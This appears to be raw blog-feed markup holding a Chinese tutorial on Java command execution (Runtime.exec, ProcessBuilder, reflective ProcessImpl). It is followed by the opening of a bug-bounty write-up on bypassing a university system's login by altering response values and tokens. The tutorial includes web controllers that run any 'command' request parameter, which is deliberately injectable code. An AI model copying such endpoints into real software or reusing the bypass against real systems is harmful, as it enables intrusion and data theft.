cmdarray)</h4><p>在单独的进程中执行指定的命令和参数。</p><p>简单来说就是以数组的形式接收多个字符串然后执行。</p><h5 id="java实现-1"><a href="#java实现-1" class="headerlink" title="java实现"></a>java实现</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//示例</span></span><br><span class="line">String[] command = &#123;<span class="string">&quot;powershell&quot;</span>,<span class="string">&quot;/c&quot;</span>,<span class="string">&quot;ping www.baidu.com&quot;</span>&#125;</span><br><span class="line">Runtime.getRuntime().exec(command);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">cmdarray</span><span class="params">(String[] command)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(command);</span><br><span class="line">        <span class="comment">//使用BufferedReader设置编码解决执行命令响应中文乱码问题</span></span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream(), Charset.forName(<span class="string">&quot;GBK&quot;</span>)));</span><br><span class="line">        <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//主方法直接调用 </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String[] command2 = &#123;<span class="string">&quot;powershell&quot;</span>,<span class="string">&quot;/c&quot;</span>,<span class="string">&quot;ping www.baidu.com&quot;</span>&#125;;</span><br><span class="line">        cmdarray(command2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/03/11/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/img/4.png" alt="image-20240310152142609"></p><h5 id="javaweb中实现"><a href="#javaweb中实现" class="headerlink" title="javaweb中实现"></a>javaweb中实现</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/execRuntimeArray&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execRuntimeArray</span><span class="params">(String command, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        String[] commandarray =&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/c&quot;</span>,command&#125;;</span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(commandarray);</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream(), Charset.forName(<span class="string">&quot;GBK&quot;</span>)));</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">//逐行读取</span></span><br><span class="line">            System.out.println(line);</span><br><span class="line">            out.print(line);</span><br><span class="line">        &#125;</span><br><span class="line">        bufferedReader.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/03/11/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/img/5.png" alt="image-20240310152443364"></p><h3 id="java-lang-ProcessBuilder"><a href="#java-lang-ProcessBuilder" class="headerlink" title="java.lang.ProcessBuilder"></a>java.lang.ProcessBuilder</h3><p>​ProcessBuilder同样也是lang包中的一个类，这个类主要用于创建操作系统进程，此类两个重要且常用的方法<code>command()</code>和<code>start()</code></p><h4 id="command-start"><a href="#command-start" class="headerlink" title="command()+start()"></a>command()+start()</h4><p>​command()有四种重载形式，也都和exec大同小异，一种是可变的字符串，简单说就是可以传入普通字符串，或者字符串数组，另一种是字符串列表。有exec的案例，就不演示command()的重载了</p><p><img src="/2024/03/11/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/img/6.png" alt="image-20240310153557809"></p><p>​start()用来执行通过command()设置的命令</p><p>​<strong>使用此方法执行命令流程：command()设置命令  &#x3D;&#x3D;》start()启动进程</strong></p><h5 id="java实现-2"><a href="#java实现-2" class="headerlink" title="java实现"></a>java实现</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//示例</span></span><br><span class="line"><span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>();</span><br><span class="line">processBuilder.command(<span class="string">&quot;calc&quot;</span>); <span class="comment">//设置启动计算器的命令</span></span><br><span class="line">processBuilder.start();<span class="comment">//执行命令</span></span><br></pre></td></tr></table></figure><p><img src="/2024/03/11/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/img/7.png" alt="image-20240310160038351"></p><h5 id="javaweb实现-1"><a href="#javaweb实现-1" class="headerlink" title="javaweb实现"></a>javaweb实现</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProcessBuilderController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/processBuilder&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processBuilder</span><span class="params">(String command, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>();</span><br><span class="line">        processBuilder.command(command);</span><br><span class="line">        <span class="type">Process</span> <span class="variable">start</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(start.getInputStream(), Charset.*forName*(<span class="string">&quot;GBK&quot;</span>)));</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="literal">null</span>)&#123;</span><br><span class="line">            out.print(line);</span><br><span class="line">        &#125;</span><br><span class="line">        bufferedReader.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url:http://localhost:8080/processBuilder?command=calc</span><br></pre></td></tr></table></figure><p><img src="/2024/03/11/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/img/8.png" alt="image-20240310160418616"></p><h3 id="java-lang-ProcessImpl"><a href="#java-lang-ProcessImpl" class="headerlink" title="java.lang.ProcessImpl"></a>java.lang.ProcessImpl</h3><p>​这里就不赘述反射相关的知识了，不懂java反射的同学可以先去学下反射再来看</p><p>​在JDK9之前，它是两个类：<code>UNIXProcess</code>和<code>ProcessImpl</code>，JDK9之后就把它们俩合并到了一个类中了</p><p><img src="/2024/03/11/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/img/9.png" alt="image-20240310161408091"></p><p>​ProcessImpl相对于其它两种就比较特殊了，ProcessImpl 是更为底层的实现，Runtime和ProcessBuilder执行命令实际上也是调用了ProcessImpl这个类，对于ProcessImpl，我们不能和其它两个类一样直接调用方法，java.lang.ProcessImpl 都被 private 封装起来了，并没有设置公共的 API 接口，只能<strong>通过反射调用</strong>。</p><h5 id="java实现-3"><a href="#java实现-3" class="headerlink" title="java实现"></a>java实现</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.Charset;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExecProcessImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            String[] cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;whoami&quot;</span>&#125;;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.*forName*(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getDeclaredMethod(</span><br><span class="line">                <span class="string">&quot;start&quot;</span>,</span><br><span class="line">                String[].class,</span><br><span class="line">                Map.class,</span><br><span class="line">                String.class,</span><br><span class="line">                ProcessBuilder.Redirect[].class,</span><br><span class="line">                <span class="type">boolean</span>.class</span><br><span class="line">        );</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> (Process) method.invoke(<span class="literal">null</span>, cmds, <span class="literal">null</span>, <span class="string">&quot;.&quot;</span>, <span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream(), Charset.*forName*(<span class="string">&quot;GBK&quot;</span>)));</span><br><span class="line">        <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/03/11/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/img/10.png" alt="image-20240310162820846"></p><h5 id="javaweb实现-2"><a href="#javaweb实现-2" class="headerlink" title="javaweb实现"></a>javaweb实现</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProcessImplController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/processImpl&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processImpl</span><span class="params">(String command, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String[] cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;command&#125;;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.*forName*(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getDeclaredMethod(</span><br><span class="line">                <span class="string">&quot;start&quot;</span>,</span><br><span class="line">                String[].class,</span><br><span class="line">                Map.class,</span><br><span class="line">                String.class,</span><br><span class="line">                ProcessBuilder.Redirect[].class,</span><br><span class="line">                <span class="type">boolean</span>.class</span><br><span class="line">        );</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> (Process)method.invoke(<span class="literal">null</span>,cmds,<span class="literal">null</span>,<span class="string">&quot;.&quot;</span>,<span class="literal">null</span>,<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream(), Charset.*forName*(<span class="string">&quot;GBK&quot;</span>)));</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        <span class="keyword">while</span> ((line = bufferedReader.readLine())!= <span class="literal">null</span>)&#123;</span><br><span class="line">            writer.print(line);</span><br><span class="line">        &#125;</span><br><span class="line">        bufferedReader.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/03/11/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/img/11.png" alt="image-20240310163342400"></p><p>​到这里，java命令执行的基础就完毕了</p><h2 id="进阶-反射调用命令执行"><a href="#进阶-反射调用命令执行" class="headerlink" title="进阶-反射调用命令执行"></a>进阶-反射调用命令执行</h2><p>​</p><p>​通过反射来调用命令执行。</p><p>​因为三个命令执行类中，ProcessImpl只能通过反射调用 而且上述也已经演示，这里只讲述Runtime和ProcessBuilder。</p><h4 id="Runtime类"><a href="#Runtime类" class="headerlink" title="Runtime类"></a>Runtime类</h4><p>​Runtime类中 常用且简单粗暴的两种调用方法，<strong>getMethod()</strong>  、<strong>getDeclaredConstructor()</strong>  </p><h5 id="getMethod"><a href="#getMethod" class="headerlink" title="getMethod()"></a>getMethod()</h5><p>​获取一个类的一个public方法</p><p>​如下，通过反射调用Runtime类中的exec方法执行命令。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">runtime</span> <span class="operator">=</span> getRuntimeMethod.invoke(clazz);</span><br><span class="line">        execMethod.invoke(runtime, <span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​大家可能会发现，这里多了一个名为<code>getRuntime</code>方法，这是为什么？跟进到Runtime类可以得知</p><p>​<img src="/2024/03/11/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/img/12.png"></p><p>​橙色的锁在idea中表示private权限，也就是说Runtime类的构造器是私有的，因此不能直接使用<code>newInstance() </code>创建一个实例</p><p>​这个getRuntime又是什么，为什么需要用到这个方法来执行命令？</p><p>​跟进类源码可以看到</p><p><img src="/2024/03/11/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/img/13.png" alt="image-20240311174705517"></p><p>​因为Runtime类是私有的，jdk提供了一个公开的静态getRuntime()方法，这个方法返回了一个私有的静态实例变量<code>currentRuntime</code>，并将其初始化为<code>new Runtime()</code>，也就是一个新的<code>Runtime</code>对象，然后再调用其exec()方法。这涉及到了<strong>”单例模式“</strong>这个概念，大概就是将类的构造函数设为私有，再通过静态方法来获取，以此来减少资源的消耗和启动时间。</p><p><img src="/2024/03/11/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/img/14.png" alt="image-20240311180837386"></p><h5 id="getDeclaredConstructor"><a href="#getDeclaredConstructor" class="headerlink" title="getDeclaredConstructor()"></a>getDeclaredConstructor()</h5><p>​获得一个任意权限的构造器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    Class&lt;?&gt; clazz = Class.*forName*(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">m</span> <span class="operator">=</span> clazz.getDeclaredConstructor();</span><br><span class="line">    m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Method</span> <span class="variable">c1</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">    c1.invoke(m.newInstance(), <span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/03/11/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/img/15.png" alt="image-20240311183403259"></p><p>​构造器就一个，且没有传递构造参数。</p><p><img src="/2024/03/11/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/img/16.png" alt="image-20240311191043898"></p><h4 id="ProcessBuilder类"><a href="#ProcessBuilder类" class="headerlink" title="ProcessBuilder类"></a>ProcessBuilder类</h4><p>​相对于Runtime类，ProcessBuilder类携带了两个public的构造器：<strong>ProcessBuilder(List<String>)<strong>、</strong>ProcessBuilder(String)</String></strong></p><p>​直接通过newInstance()访问构造器，创建一个实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>));</span><br><span class="line">        clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(object,<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>​类中可以看到，给command属性传递了命令，然后再调用start()方法去执行命令</p><p>​<img src="/2024/03/11/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/img/17.png" alt="image-20240311192102761"></p><h2 id="end"><a href="#end" class="headerlink" title="end"></a>end</h2>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>记一次SRC漏洞挖掘的Getshell</title>
      <link href="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/"/>
      <url>/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/</url>
      
        <content type="html"><![CDATA[<p><strong>注：微信公众号，csdn，freebuf原创以及本博客，都为我本人。</strong> 转载请邮件告知！</p><p><strong>免责声明：由于传播、利用本文所发布的而造成的任何直接或者间接的后果及损失，均由使用者本人承担</strong></p><h2 id="挖src过程中一次巧妙的getshell"><a href="#挖src过程中一次巧妙的getshell" class="headerlink" title="挖src过程中一次巧妙的getshell"></a>挖src过程中一次巧妙的getshell</h2><p>直接打穿了某985高校，大概有惊人的五万多人的身份证人脸和个人信息数据…..</p><p>听朋友说某证书改版了，最近闲来无事，也刚好想换一个</p><p><img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/1.png" alt="9b748ba000a84cf688f02751ae539ca5"></p><p>最后一次交漏洞，这已经是2021年了，有漏洞次数但是rank还不够，直接开干</p><h3 id="START"><a href="#START" class="headerlink" title="START"></a>START</h3><p>​涉及敏感内容已经高度马赛克，逻辑漏洞+文件上传的绕过</p><h4 id="寻找目标"><a href="#寻找目标" class="headerlink" title="寻找目标"></a>寻找目标</h4><p>​举例：</p><p>​<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/2.png" alt="在这里插入图片描述"></p><p>​这个语法简单粗暴，是我平时用过最多的了</p><p>​<strong>首先说一下这种语法的优与劣(个人经验，是否正确因人而异)：</strong></p><p>​<strong>好处</strong></p><ul><li>​可以发现目标的ip站点，就是比如标题是xxxx管理，ip:22.22.22.22类似这种，因为平常域名防护的话是比较好的(不绝对)，ip就不如，而且ip直接绕过了云waf，包括c段，扫端口(留意是不是云服务器)，也比域名的方便，况且拿到域名有时候还要找到真实ip不是吗？例如↓</li></ul><p>​<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/3.png" alt="在这里插入图片描述"></p><p><em>如果你用host domain之类的语法 就是针对于域名的搜索了，不是很容易发现ip的资产</em></p><p>​<strong>坏处</strong></p><ul><li>​最重要的就是会 偏离攻击目标 也就是打偏，刚开始的朋友比较容易犯这个错误，大佬装看不到，例如↓<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/4.png" alt="在这里插入图片描述"></li></ul><p>​比如这种，只是一些引流的广告，把同济当标题的一个噱头，或者说一些报考院校咨询站的标题 之类的，如下↓就是目标外的站点</p><p>​<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/5.png" alt="在这里插入图片描述"></p><p>​这样的话用title岂不是浪费了自己的精力和时间，大家在实战中一定要信息观察，避免白忙活。</p><p>​还有呢就是body的语法，这个筛选难度太复杂，就不说了。</p><p>​简而言之，打点或者说是搜集资产，<strong>尽量使用多个语法配合逻辑符拼接整合，去搜索和筛选</strong>，这样以确保收集的站点更全更多。</p><p>​</p><h4 id="锁定目标"><a href="#锁定目标" class="headerlink" title="锁定目标"></a>锁定目标</h4><p>​<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/6.png" alt="在这里插入图片描述"></p><p>​爽，一眼有</p><p>​看到这种目标，首先分析一下指纹</p><p>​<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/7.png" alt="在这里插入图片描述"></p><p>​vue前端框架，看到这种框架，就看一下源码，一般前端信息特别特别多的</p><p>​然后就去测试未授权，看js，抓包看接口之类的漏洞，至少我遇到的vue百分之七八十或多或少都有不同程度的逻辑漏洞和未授权，涉及到了一个路由守卫的东西<br>​因为已经验证有漏洞， 多余的就不赘述。</p><h4 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h4><h5 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h5><p>​<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/8.png" alt="在这里插入图片描述"></p><p>​留意一下token是空</p><p><img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/9.png" alt="9"></p><p>​返回包1改成0。</p><p>​<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/10.png" alt="在这里插入图片描述"></p><p>​进去一瞬间，然后直接弹出来，拦截不放包的话也是不能点那些功能的，不拦截就闪退。</p><p>​当时对js看了很久，但是没有截图就不细说了。</p><p>​重新抓包测试</p><p>​<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/11.png" alt="在这里插入图片描述"></p><p>​这次发现 token默认有了一个值 undefined 也就是未赋值的声明。</p><p>​然后重复改包1变成0，居然发现不闪退了。</p><p>​<img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/12.png" alt="在这里插入图片描述"></p><h5 id><a href="#" class="headerlink" title></a></h5><p>​猜测是token起码是要有一个值的，<strong>undefined也是一个值，这里应该是设计有逻辑缺陷，按理说未赋值undefined不应该作为一个值，这里token不能是空的，黑盒测试嘛，就是大胆猜一猜，</strong>我的推测是这样的，空就主页面闪退，有值的话主页不闪退，功能点触发再去鉴定这个token是否正确。</p><p>​f12给它一个值</p><p>​<strong>至于为什么随便赋一个值，而不去使用undefined呢，我就是担心万一后端有”!&#x3D;”这种 对undefined的检测</strong></p><p><img src="/2023/03/13/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84Getshell/img/13.png" 